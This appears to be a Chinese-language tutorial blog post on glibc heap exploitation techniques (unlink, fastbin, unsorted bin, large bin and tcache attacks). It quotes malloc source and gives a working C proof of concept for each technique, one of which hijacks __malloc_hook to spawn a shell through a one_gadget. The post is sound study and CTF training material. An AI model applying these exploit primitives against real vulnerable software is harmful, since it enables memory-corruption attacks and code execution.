
# 参考
[linux 堆利用](https://blog.csdn.net/qq_45323960/article/details/123003301?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172169409016800172545958%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=172169409016800172545958&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-123003301-null-null.nonecase&utm_term=glibc&spm=1018.2226.3001.4450)

涉及到的相关poc和版本信息已经放到github上了[https://github.com/FULLK/glibc-chunk-poc-basic](https://github.com/FULLK/glibc-chunk-poc-basic)

#  前置
[gcc 编译中保护机制的关闭和开启](https://leeyuxun.github.io/gcc%E7%BC%96%E8%AF%91%E4%B8%AD%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%9A%84%E5%85%B3%E9%97%AD%E5%92%8C%E5%BC%80%E5%90%AF.html)

对于一些复杂的堆利用，可以先用支持源码调试的 libc 完成利用，然后改偏移打题目提供的 libc，这里是参考的一个仓库[https://gitcode.net/qq_45323960/debug_glibc](https://gitcode.net/qq_45323960/debug_glibc)

一些调试支持源码和调试信息和切换库和链接器的命令


```bash
show debug-file-directory
set debug-file-directory /home/llk/Desktop/tools/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/.debug/
info share 再次查看发现导入成功

 directory 源码路径

patchelf --set-interpreter 新的ld文件的路径 当前程序名
patchelf --replace-needed 原来第二行的==>前的libc名 新的libc文件的路径

```
另外注意的是一般下面这些宏都不会启用
```c
#if !MALLOC_DEBUG

# define check_chunk(A, P)
# define check_free_chunk(A, P)
# define check_inuse_chunk(A, P)
# define check_remalloced_chunk(A, P, N)
# define check_malloced_chunk(A, P, N)
# define check_malloc_state(A)

#else

# define check_chunk(A, P)              do_check_chunk (A, P)
# define check_free_chunk(A, P)         do_check_free_chunk (A, P)
# define check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)
# define check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)
# define check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)
# define check_malloc_state(A)         do_check_malloc_state (A)

```

# unlink
free后准备放入unsortedbin中之前会进行相关检查看是否需要和前后chunk合并，先和低地址的看是否合并，再和高地址的检查是否需要合并
```c
P是要从链表中脱下来的chunk   

static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  bk->fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
    {
      if (p->fd_nextsize->bk_nextsize != p
	  || p->bk_nextsize->fd_nextsize != p)
	malloc_printerr ("corrupted double-linked list (not small)");

      if (fd->fd_nextsize == NULL)
	{
	  if (p->fd_nextsize == p)
	    fd->fd_nextsize = fd->bk_nextsize = fd;
	  else
	    {
	      fd->fd_nextsize = p->fd_nextsize;
	      fd->bk_nextsize = p->bk_nextsize;
	      p->fd_nextsize->bk_nextsize = fd;
	      p->bk_nextsize->fd_nextsize = fd;
	    }
	}
      else
	{
	  p->fd_nextsize->bk_nextsize = p->bk_nextsize;
	  p->bk_nextsize->fd_nextsize = p->fd_nextsize;
	}
    }
}
```
条件
- FD->bk = P 和 BK->fd = P
-  chunk2 的 prev_size 修改成 fake chunk 的 size
- chunk2 的 size 的 PREV_INUSE 位 为 0 ，且 chunk2 的大小不能在 fast bin 范围。

效果
 - FD->bk = BK   BK->fd = FD	


## poc

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char* array[5];
    array[3]=malloc(0x98);
    array[4]=malloc(0x4f0);
    malloc(0x10);
    printf("array[3] %p\n",array[3]);
    *(long*)(array[3])=0;
    *(long*)(array[3]+8)=0x91;
    *(long*)(array[3]+16)=&array[0]; //fd
    *(long*)(array[3]+24)=&array[1]; //bk
    *(long*)(array[3]+0x90)=0x90; //chunk2 presize
    // edit chunk1
    *(array[3]+0x98)=0; //change preinuse
    //off by one
    free(array[4]);
    // FD->bk = BK;							      
    // BK->fd = FD;
    // change array[3]=fd==&array[0]
    printf("&array[0] %p\n",&array[0]);
    printf("array[3] %p\n",array[3]);
    return 0;
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/adb9ad0191214aedace6ff24f5f0fcda.png)
# Fastbin Attack
## Fastbin Double Free
- 先free chunk1
存在如下检查，但只检查了fastbin开始的
```c

    if (SINGLE_THREAD_P)
      {
	/* Check that the top of the bin is not the record we are going to
	   add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  malloc_printerr ("double free or corruption (fasttop)");
	p->fd = old;
	*fb = p;
      }
    else
      do
	{
	  /* Check that the top of the bin is not the record we are going to
	     add (i.e., double free).  */
	  if (__builtin_expect (old == p, 0))
	    malloc_printerr ("double free or corruption (fasttop)");
	  p->fd = old2 = old;
	}
      while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))
	     != old2);
```

- 再free chunk2
- 再free chunk1
- malloc得到chunk1进而修改在bin中的chunk1的fd，该fd存在如下检查  

```c
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)->mchunk_size) //mchunk_size就是chunk中的size值
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
   
		 size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
	 
 # define check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)   
 //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
 static void
do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)
{
  INTERNAL_SIZE_T sz = chunksize_nomask (p) & ~(PREV_INUSE | NON_MAIN_ARENA);

  if (!chunk_is_mmapped (p))
    {
      assert (av == arena_for_chunk (p));
      if (chunk_main_arena (p))
        assert (av == &main_arena);
      else
        assert (av != &main_arena);
    }

  do_check_inuse_chunk (av, p);

  /* Legal size ... */
  assert ((sz & MALLOC_ALIGN_MASK) == 0);
  assert ((unsigned long) (sz) >= MINSIZE);
  /* ... and alignment */
  assert (aligned_OK (chunk2mem (p)));  
  /* chunk is less than MINSIZE more than request */
  assert ((long) (sz) - (long) (s) >= 0);
  assert ((long) (sz) - (long) (s + MINSIZE) < 0);
}


```
- `if (__builtin_expect (victim_idx != idx, 0))`和`fastbin_index`会检查右移动4位（64位系统）后的size和当前fastbin对应的size是否一致（0x7f等价于0x70）
- check_remalloced_chunk这里一般要开启某个模式才可以启动，有宏定义相关，一般都不会调用，其中就会有 assert (aligned_OK (chunk2mem (p)));  fd地址保证地址对齐，还有 assert ((sz & MALLOC_ALIGN_MASK) == 0);会检查size是否是0x10对齐，~~如果开启，size为0x7f和没对齐的地址就过不了了，但一般不会开启~~ 
### poc 
但注意fastbin中fd的最后剩下的那个fd可能会导致printf输出的时候申请堆时候会出现问题

```c
#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>

int main()
{   

    size_t* chunk1=malloc(0x60);
    size_t* chunk2=malloc(0x60);
   

    free(chunk1);
    free(chunk2);
    free(chunk1);
  
    chunk1=malloc(0x60);
    size_t fake_chunk[4];
    chunk1[0]=fake_chunk;
    fake_chunk[0]=0;
    fake_chunk[1]=0x7f;
    fake_chunk[2]= NULL;
    malloc(0x60);
    malloc(0x60);
    size_t* dest_chunk=malloc(0x60);
    return 0;
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4f1841aad4c04c66a85487a99c53f877.png)


## Alloc to Stack & Arbitrary Alloc

劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的地址处，从而实现控制一些关键数据，比如返回地址等。

fastbin中fd 指向的内存能申请出来的前提是该内存对应 size 处的值与该 fast bin 对应 size 相同。

```c
 if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
            …………
        }
```
一般先通过house of spirit或者double free进而能够劫持fd，一般只会检查`if (__builtin_expect (victim_idx != idx, 0))`和`fastbin_index`会检查右移动4位（64位系统）后的size和当前fastbin对应的size是否一致（0x7f等价于0x70）没有检查地址对齐和size对齐

例如修改 fd 指针指向 __realloc_hook 前合适的偏移（通常是 __malloc_hook 往前 0x23 的偏移），两次 malloc(0x60) 申请出该地址的 fake chunk 实现对 __realloc_hook 和 __malloc_hook 的控制。

由于 one_gadget 可能因栈结构不满足条件而失效，可以通过修改 __malloc_hook 为 realloc+偏移 ，修改 __realloc_hook 为 one_gadget 改变栈结构来获取 shell 。
除了 realloc + 偏移外，还可以通过触发 malloc 报错执行 malloc 来改变栈结构。

### poc

```c

#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

    puts("relocation puts");
    size_t libc_addr=puts-0x67870;
    printf("puts_addr %p\n",puts);
    printf("libc_addr %p\n",libc_addr);
    size_t* malloc_hook=libc_addr+0x39bb10;
    size_t* realloc_hook=libc_addr+0x39bb10-0x8;
    size_t* malloc_hook_23=libc_addr+0x39bb10-0x23;//0xfff7736260000000	0x000000000000007f
    size_t* malloc_hook_23_data=libc_addr+0x39bb10-0x23+0x10;
    size_t* onegadget=libc_addr+0x3f3e6;
    size_t* __libc_realloc_off_addr=libc_addr+0x78d00+0x6;
// 0xd5c07 execve("/bin/sh", rsp+0x70, environ)
// constraints:
//   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv



    printf("&malloc_hook-0x23 %p\n",malloc_hook_23);
    printf("&malloc_hook-0x23+0x10 %p\n",malloc_hook_23_data);
    size_t* chunk=malloc(0x60);
    malloc(0x60); // next not top
    free(chunk);
    chunk[0]=malloc_hook_23;
    malloc(0x60);
    size_t* dest_chunk=malloc(0x60);
    printf("dest_chunk %p\n",dest_chunk);
    *(size_t*)((char*)dest_chunk+3+8)=onegadget;
    *(size_t*)((char*)dest_chunk+3+8+8)=__libc_realloc_off_addr;
     printf("__libc_realloc_off_addr %p\n",__libc_realloc_off_addr);
    malloc(0x10);
}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/dee2d9de213c4695afc4e140713235f7.png)
```bash
b*__libc_realloc+499
```
跳转位置前有pop
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/929bf83f65a74970bbfa84b847951649.png)
此时的栈，~~所以我们选择能够pop三次再跳转的指令就行~~ ，如果直接从跳转之前的那些pop不行，因为rax还没设置跳转地址，所以还是从刚开始来，那就少push三次的位置就行了
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3018dce0a3a44f5594dbc83f30063ee4.png)
成功
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d89d6c79996747949e49f0c32a3ef7e1.png)

# Unsorted Bin Attack

## Unsorted Bin Leak
 unsorted bin 是双向链表，因此在 unsorted bin 链表中必有一个节点的 fd 指针会指向 main_arena 结构体内部。如果我们可以把正确的 fd 指针 leak 出来，就可以获得一个与 main_arena 有固定偏移的地址，这个偏移可以通过调试得出。
 
main_arena 是一个 struct malloc_state 类型的全局变量，是 ptmalloc 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 .data 或者 .bss 等段上，那么如果我们有进程所使用的 libc 的 .so 文件的话，我们就可以获得 main_arena 与 libc 基地址的偏移，从而获取 libc 的基地址。

main_arena 和 __malloc_hook 的地址差是 0x10`main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10`

### poc
free后会残留，再次malloc也会残留。但printf会分配chunk，所以这里注释掉，不然后面的malloc申请不回来原来free掉的
```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    size_t* chunk1=malloc(0x410);
    malloc(0x10);
    free(chunk1);
    //printf("after afree unsorted bin fd %p bk %p\n",chunk1[0],chunk1[1]);
    size_t* chunk2=malloc(0x10);
    printf("malloc part fd %p bk %p\n",chunk2[0],chunk2[1]);
    
}
```
## Unsorted Bin Attack
当将一个 unsorted bin 取出的时候（先进先出），会将 bck->fd 的位置写入本 Unsorted Bin 的位置。（针对取出之前 unsorted bin还有多于1个chunk，不然作为last_remainder处理），这里先移除链表后再判断移除的这个chunk的size是否等于要求的，符合就返回，不符合会根据size放到smallbin或者largebin

```c
  while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
        ……
			bck = victim->bk;
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
          ……
          }
```

换而言之，如果我们控制了最后面的chunk的 bk 的值，即bck，我们就能将 unsorted_chunks (av) 写到任意地址（bck的地址处）。通常可以利用此方法向 global_max_fast 写入一个较大的值，从而扩大 fast bin 范围，甚至 fastbinsY 数组溢出 造成任意地址写。

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2734c502d54c4999b49bd80dc6812443.png)


unsorted bin attack 之后，fake chunk 被链入 unsorted bin 中（`unsorted_chunks (av)->bk = bck;`），此时要想将 unsorted bin 申请出来必须通过如下检查：

- 检查 size 范围是否在一定范围

```c
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
				   > av->system_mem, 0))
            malloc_printerr ("malloc(): memory corruption");
```






- unsorted bin chunk 的 bk（bck） 字段指向的地址必须为可写

```c

  while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
        ……
			bck = victim->bk;
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
          ……
          }
```
```c

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb); //不会执行
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
```


不过从 glibc-2.28 开始会有如下检查，这样必须往bck->fd先写victim，这样其实已经达到原先写的目的了，所以没用

但如果申请chunk还是有用的，但需要满足写bk后bck->fd=victim，这样才能将bck的放入unsortedbin，当下次申请时依然要满足bck->fd=victim，也就是`bck->fd=victim；bck->bk->fd=bck `
```c
/* remove from unsorted list */
if (__glibc_unlikely (bck->fd != victim))
	malloc_printerr ("malloc(): corrupted unsorted chunks 3");

```

### poc

写bck->fd
```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    size_t* chunk1=malloc(0x410);
    size_t* fakechunk[0x20];
    malloc(0x10);
    free(chunk1);
    size_t*global_max_fast_addr =chunk1[1]+0x1cd0;
    chunk1[1]=chunk1[1]+0x1cd0-0x10;
    size_t* chunk2=malloc(0x410);
   
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d8df63b5a42f4497b73388a407bb6f00.png)
申请到bck

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    size_t* chunk1=malloc(0x410);
    size_t* fakechunk[0x20];
    malloc(0x10);
    free(chunk1);
    chunk1[1]=fakechunk;
    fakechunk[1]=0x20;
    size_t* chunk2=malloc(0x410);
    size_t* destchunk=malloc(0x10);
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1c0ebfe97d0c40d39400ff65b3c75c74.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b9899954416f42cc906cb3516cdbc96e.png)


# Large Bin Attack
Large Bin Attack 就是通过修改位于 large bin 的 chunk 的 bk 或者 bk_nextsize ，然后让其它的 chunk 进入 large bin ，借助链表操作在目标地址处写入一个堆的地址。

glibc-2.30 之前，由于 chunk 链入 large bin 的过程中缺乏对 bk 和 bk_nextsize 指针的检查，因此可以 通过修改 bk 和 bk_nextsize 指针进行两处任意地址写。

- 加入的large chunk小于最小的会进入下面处理流程
```c
			  bck = bin_at (av, victim_index);
              fwd = bck->fd;
               assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
```
 此时改`  bck = bck->bk;`不好改bk，因为在main_area里，所以改`fwd->fd->bk_nextsize `，此时`  victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;`会在`bk_nextsize`指向的地方写入一个堆地址
                      
- 加入的large chunk不小于最小的会进入下面处理流程

```c
  bck = bin_at (av, victim_index);
              fwd = bck->fd;
               assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                     
                    }
                     else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                    
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
```
- 这里不能和其中的size相等，不然无法利用，所以需要大于其中一个，此时修改小于当前要插入chunk的那个chunk（`fwd`）的`bk_nextsize`然后完成` victim->bk_nextsize->fd_nextsize = victim;`往bk_nextsize的指向的地方写一个堆地址
- 还可以修改`fwd->bk`然后完成`  bck = fwd->bk; bck->fd = victim;`也能往bk指向的地方写一个堆地址

自 glibc-2.30 开始如果加入的 chunk 不是最小的则在插入链表时会对 bk 指针和bk_nextsize进行检查。此时只能通过加入的large chunk小于最小，改bk_nextsize来写任意地址为堆地址

```c
bck = fwd->bk;         //fwd是小于加入chunk的后一个chunk 
 else
       {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                      }
                      bck = fwd->bk;
                      if (bck->fd != fwd)
                   malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
                     

```


除了申请更大的 chunk 外，也可以通过申请较小的 chunk 来触发 large bin attack 。因为修改的依然是原来在largebin中的chunk，此时unsortedbin放入smallbin和largebin后，此时已经完成写修改了，通过分割放入largebin中的chunk时的unlink操作也能实现往此时的bk或者bk_nextsize写一个堆地址，可以看下面的unlink具体操作

 如果切割后剩余大小不在 small bin 范围内就不会放入last_remainder ，因为成为 last_remainder 的条件之一是largebin中切割后大小在 small bin 范围内
  
```c

 else
                {
                  remainder = chunk_at_offset (victim, nb);

                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
	  if (__glibc_unlikely (fwd->bk != bck))
                    {
                      errstr = "malloc(): corrupted unsorted chunks 2";
                      goto errout;
                    }
                  remainder->bk = bck;
                  remainder->fd = fwd;
                  bck->fd = remainder;
                  fwd->bk = remainder;

                  /* advertise as last remainder */
                  if (in_smallbin_range (nb))
                    av->last_remainder = remainder;
                  if (!in_smallbin_range (remainder_size))
                    {
                     …………
                }
```

当进入unsortedbin的chunk进入largebin后，程序会在 对应的idx的bin 中按 size 升序寻找合适 chunk 来切割出所需的内存。然后按照idx++来遍历，之后该 chunk 会从 bin 中取出然后从中切下所需的内存并将剩余部分放入 unsorted bin或者smallbin 。因此最终写入 target 的值是最开始修改了 bk_nextsize 的 chunk 的地址。`  P->bk_nextsize->fd_nextsize = P->fd_nextsize;或者 BK->fd = FD;	`

```c
          bin = bin_at (av, idx);

          /* skip scan if empty or largest chunk is too small */
          if ((victim = first (bin)) != bin
	      && (unsigned long) chunksize_nomask (victim)
	        >= (unsigned long) (nb))
            {
              victim = victim->bk_nextsize;
              while (((unsigned long) (size = chunksize (victim)) <
                      (unsigned long) (nb)))
                victim = victim->bk_nextsize;
              ...
              unlink_chunk (av, victim);
			  ... // 切割 chunk 并将 chunk 的剩余部分放入 unsorted bin
            }
#define unlink(AV, P, BK, FD) {
…………

 FD = P->fd;								      \
    BK = P->bk;	
   else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;	
        ……	
else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }		
}
```

### poc
- 加入的large chunk小于最小，改bk_nextsize
```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getlibc()
{
    puts("getlibc");
    size_t libc_addr=puts-0x67870;
    size_t global_max_fast=libc_addr+0x39d848;
    return global_max_fast;
}

int main()
{
    size_t* chunk1=malloc(0x420);
    malloc(0x10);
    size_t* chunk2=malloc(0x410);
    malloc(0x10);   
    size_t* chunk3=malloc(0x400); // puts use
    malloc(0x10); 

    free(chunk3);  // puts use
    size_t global_max_fast_20=getlibc()-0x20;
    
    free(chunk1);
    malloc(0x500);
    free(chunk2);
    chunk1[3]=global_max_fast_20;
    malloc(0x500);
}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0eb0920b4ea2456aa5a2482a61e88546.png)
-  加入的large chunk不小于最小的，大于某一个，改bk_nextsize或者bk

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getlibc()
{
    puts("getlibc");
    size_t libc_addr=puts-0x67870;
    size_t global_max_fast=libc_addr+0x39d848;
    return global_max_fast;
}

int main()
{
    size_t* chunk1=malloc(0x410);
    malloc(0x10);
    size_t* chunk2=malloc(0x420);
    malloc(0x10);   
    size_t* chunk3=malloc(0x400); // puts use
    malloc(0x10); 

    free(chunk3);  // puts use
    size_t global_max_fast_20=getlibc()-0x20;
    
    free(chunk1);
    malloc(0x500);
    free(chunk2);
    //chunk1[1]=global_max_fast_20+0x10;
    chunk1[3]=global_max_fast_20;
    malloc(0x500);
}
```
- 改chunk1[3]=global_max_fast_20;
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2be293b466d742b8aef587b72a10a754.png)
- 改chunk1[1]=global_max_fast_20+0x10;
原来的largebin中的第一个chunk
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/cb4ee67ada12471eaf5e00e4d804325c.png)
放入largebin之后
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/221e5eac06f744b4bb972cdf248e7528.png)


# Tcache attack
Tcache是Glibc 2.26引入的，它的next 指针指向的是下一个 chunk 的内存区域，不是堆头，且检查比 fast bin 少，并且有限制个数
##  bypass tcache to bin
如果想让释放的 chunk 不经过tcache 有如下方法：

- 释放不在 tcache 大小范围的 chunk。
- 释放 7 个同样大小的 tcache 填满对应位置的tcache  bin。
- 如果题目限制了 free 次数那么需要通过 满足`tcache->entries[tc_idx] != NULL` 再 malloc 多次` --(tcache->counts[tc_idx])`将 counts 对应位置置为 -1 来绕过 tcache 。这里保证malloc时的参数size对应到一样的idx就行，然后设置的fd得是个可访问得地址才行`tcache->entries[tc_idx] = e->next;`，因为`e->next;`会访问

```c
void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
…………
}
  
  tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
} 

static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
此时对应的count数组变为-1，又因为是无符号数，所以最大，所以不会放入tcache中
```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{

  check_inuse_chunk(av, p);

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
  }
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/73ba06d370a44d0ba874d6fb842ee4d0.png)

- 控制 tcache_perthread_struct（堆地址） 然后修改count数组的值为7或者更大， 实现free后绕过 tcache 。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a205157513be4f64b3f4a9dc744ad3e7.png)
### poc

这里发现可以通过libc地址读到tcache_perthread_struct地址出来
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0653c8447f4d4e5fa58ed6d5f223fb02.png)

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c0+0x8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{   
    // 释放 7 个同样大小的 tcache 填满对应位置的tcache  bin。
    size_t chunkarray[0x10];
    for(int i=0;i<0x8;i++)
    {
        chunkarray[i]=malloc(0x10);
    }
    for(int i=0;i<0x8;i++)
    {
        free(chunkarray[i]);  //chunkarray[7] in fastbin
    }
    //释放不在 tcache 大小范围的 chunk。
    size_t* chunk1=malloc(0x410); //smallest
    malloc(0x20); //padding and size not frome tcache
    free(chunk1);
    // 如果题目限制了 free 次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1 来绕过 tcache 
    size_t* chunk2=malloc(0x20);
    size_t* chunk3=malloc(0x20);
    free(chunk2);
    size_t* a;
    chunk2[0]=&a; 
    malloc(0x20);
    //bins:         0x30 [  0]: 0x7fffffffdcb8
    malloc(0x20);
    //bins:         0x30 [ -1]: 0x7ffff7ffe710
    free(chunk3);
    //控制 tcache_perthread_struct 从而控制 counts 实现绕过 tcache 。
    size_t chunk4=malloc(0x30);
    char* heap_base=getheap();
    heap_base[0x12]="7";
    free(chunk4);
    
}
```
## tcache poisoning
通过覆盖 tcache 中的 next，但要可以访问，因为取出next对应的chunk时会有`e->next`然后不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。

```c
 tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
} 
```
### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    size_t* chunk1=malloc(0x10);
    free(chunk1);
    size_t fakechunk[0x20];
    chunk1[0]=fakechunk;  //memory
    malloc(0x10);
    size_t* destchunk=malloc(0x10);
    printf("destchunk 0x%p\n",destchunk);
    printf("&fakechunk[0] 0x%p\n",fakechunk);

}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ea9904d53d174372bb452bad928e5af7.png)
## tcache dup
free 两次之后再 malloc 效果等同于 uaf ，可以进行 tcache poisoning（修改malloc得到的chunk的fd即修改在tcachebin的chunk的fd） ，然后malloc两次可以得到fd对应的chunk

glibc-2.29 开始增加了 tcache key 来检测 double free 。

glibc-2.30 之后逻辑变了，原来是判断 entry[idx]!=NULL，glibc-2.30 之后判断 count[idx] > 0 
### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    size_t* chunk1=malloc(0x10);
    free(chunk1);
    free(chunk1);
    size_t* chunk2=malloc(0x10);
    size_t fakechunk[0x20];
    chunk2[0]=fakechunk;
    malloc(0x10);
    size_t* destchunk=malloc(0x10);
    printf("destchunk 0x%p\n",destchunk);
    printf("fakechunk 0x%p\n",fakechunk);

}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/12766ad0326c41e59bec239ce1fe2c5b.png)
## tcache perthread corruption
